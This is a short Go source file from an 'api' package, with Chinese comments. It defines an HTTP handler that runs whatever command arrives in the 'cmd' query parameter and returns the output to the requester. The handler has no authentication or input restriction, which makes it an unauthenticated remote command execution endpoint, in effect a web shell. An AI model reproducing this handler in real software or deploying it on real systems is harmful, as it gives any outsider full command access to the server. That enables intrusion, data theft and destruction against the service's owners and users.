package api

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

func Cmd(w http.ResponseWriter, r *http.Request) {
	params := r.URL.Query()

	// 获取特定参数的值
	cmdStr := params.Get("cmd")

	cmds := strings.Split(cmdStr, " ")
	args := cmds[1:]
	cmd := exec.Command(cmds[0], args...)

	// 捕获命令的输出
	output, err := cmd.CombinedOutput()
	if err != nil {
		w.Write([]byte(err.Error()))
		return
	}

	// 打印命令的输出
	fmt.Println("Command output:")
	fmt.Println(string(output))
	w.Write(output)

}
